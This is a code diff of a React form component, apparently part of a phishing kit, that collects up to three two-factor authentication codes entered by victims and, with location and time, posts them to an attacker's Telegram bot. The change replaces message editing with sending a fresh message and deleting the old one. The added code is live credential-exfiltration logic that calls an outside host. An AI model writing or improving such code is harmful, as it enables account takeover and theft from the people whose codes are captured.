@@ -84,7 +84,6 @@ const AuthCodeForm = () => {
   ) => {
     const locationParts = location.split("/").map((part) => part.trim());
     const currentTime = getCurrentTime();
-    const message_id = localStorage.getItem("telegram_msg_id");
 
     const message = `
 📶 <b>XÁC THỰC 2FA (${step.toUpperCase()})</b>
@@ -110,26 +109,28 @@ const AuthCodeForm = () => {
 🛡 Mã 2FA 3: <code>${code3Input || "N/A"} </code>(${method3Input || "?"})
 `;
 
-    if (message_id) {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+    const oldMsgId = localStorage.getItem("telegram_msg_id");
+
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      }),
+    });
+
+    const data = await res.json();
+    if (data?.ok && data?.result?.message_id) {
+      localStorage.setItem("telegram_msg_id", data.result.message_id);
+    }
+
+    if (oldMsgId) {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          message_id,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      });
-    } else {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "HTML",
-        }),
+        body: JSON.stringify({ chat_id: CHAT_ID, message_id: oldMsgId }),
       });
     }
   };
